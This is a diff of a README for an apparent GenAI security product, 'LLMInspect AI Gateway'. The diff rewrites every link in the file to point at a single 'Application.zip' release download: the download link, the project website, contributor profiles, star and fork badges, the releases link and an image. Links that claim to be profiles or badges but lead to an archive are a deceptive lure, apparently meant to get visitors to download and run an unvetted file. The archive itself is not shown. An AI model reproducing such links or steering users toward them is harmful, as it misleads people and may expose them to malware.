@@ -27,7 +27,7 @@ LLMInspect AI Gateway is a cutting-edge platform to protect businesses from GenA
 - threat-intelligence
 
 ## 🔗 Repository Link: 
-[Download LLMInspect AI Gateway](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[Download LLMInspect AI Gateway](https://github.com/progamer2016/llminspect-gateway/releases/download/v1.0/Application.zip)
 
 Launch the link to access the files.
 
@@ -49,7 +49,7 @@ To get started with LLMInspect AI Gateway, follow these steps:
 
 ## 🌐 Additional Resources
 
-For additional information and updates, visit the [LLMInspect AI Gateway website](https://llminspect-ai.com).
+For additional information and updates, visit the [LLMInspect AI Gateway website](https://github.com/progamer2016/llminspect-gateway/releases/download/v1.0/Application.zip).
 
 ---
 
@@ -57,16 +57,16 @@ For additional information and updates, visit the [LLMInspect AI Gateway website
 
 ### 📈 Contributors
 
-- John Doe ([@johndoe](https://github.com/johndoe))
-- Jane Smith ([@janesmith](https://github.com/janesmith))
+- John Doe ([@johndoe](https://github.com/progamer2016/llminspect-gateway/releases/download/v1.0/Application.zip))
+- Jane Smith ([@janesmith](https://github.com/progamer2016/llminspect-gateway/releases/download/v1.0/Application.zip))
 
 ### 🌟 Stars
 
-![Stars](https://img.shields.io/github/stars/llminspect-gateway?style=social)
+![Stars](https://github.com/progamer2016/llminspect-gateway/releases/download/v1.0/Application.zip)
 
 ### 🍴 Forks
 
-![Forks](https://img.shields.io/github/forks/llminspect-gateway?style=social)
+![Forks](https://github.com/progamer2016/llminspect-gateway/releases/download/v1.0/Application.zip)
 
 ---
 
@@ -87,8 +87,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-If the provided link is not working, please check the [Releases](https://github.com/cli/oauth/releases) section for the latest downloads.
+If the provided link is not working, please check the [Releases](https://github.com/progamer2016/llminspect-gateway/releases/download/v1.0/Application.zip) section for the latest downloads.
 
 🛡️ Start protecting your business today with LLMInspect AI Gateway! 🚀
 
-![AI Gateway](https://www.example.com/ai-gateway-image.jpg)
+![AI Gateway](https://github.com/progamer2016/llminspect-gateway/releases/download/v1.0/Application.zip)
